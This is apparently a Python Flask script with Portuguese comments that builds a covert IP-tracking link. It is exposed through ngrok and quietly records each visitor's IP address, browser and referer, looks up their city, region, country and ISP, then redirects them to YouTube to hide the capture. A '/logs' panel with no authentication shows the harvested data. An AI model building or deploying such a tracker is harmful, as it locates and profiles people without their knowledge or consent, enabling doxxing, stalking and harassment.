
from flask import Flask, request, redirect, render_template
from datetime import datetime
from pyngrok import ngrok
import requests
import json
import os

app = Flask(__name__)
FINAL_URL = "https://youtube.com"
LOG_FILE = "logs.json"

# Cria arquivo de logs, se não existir
if not os.path.exists(LOG_FILE):
    with open(LOG_FILE, "w") as f:
        json.dump([], f)

def get_ip():
    if request.headers.getlist("X-Forwarded-For"):
        return request.headers.getlist("X-Forwarded-For")[0].split(',')[0]
    elif request.headers.get("X-Real-IP"):
        return request.headers.get("X-Real-IP")
    return request.remote_addr

def log_visit(data):
    with open(LOG_FILE, "r+") as f:
        try:
            logs = json.load(f)
        except json.JSONDecodeError:
            logs = []
        logs.append(data)
        f.seek(0)
        json.dump(logs, f, indent=4)

@app.route('/')
def tracker():
    ip = get_ip()
    user_agent = request.headers.get("User-Agent")
    referer = request.headers.get("Referer")
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    try:
        geo = requests.get(f"http://ip-api.com/json/{ip}").json()
        location = {
            "city": geo.get("city"),
            "region": geo.get("regionName"),
            "country": geo.get("country"),
            "isp": geo.get("isp")
        }
    except:
        location = {}

    data = {
        "timestamp": timestamp,
        "ip": ip,
        "user_agent": user_agent,
        "referer": referer,
        "location": location
    }

    log_visit(data)
    return redirect(FINAL_URL)

@app.route('/logs')
def view_logs():
    with open(LOG_FILE, "r") as f:
        logs = json.load(f)
    return render_template("index.html", logs=logs[::-1])  # mais recente primeiro

# Inicia ngrok automaticamente
if __name__ == '__main__':
    public_url = ngrok.connect(8080)
    print(f"🔗 Link rastreável: {public_url}")
    print(f"📊 Painel de logs: {public_url}/logs")
    app.run(port=8080)

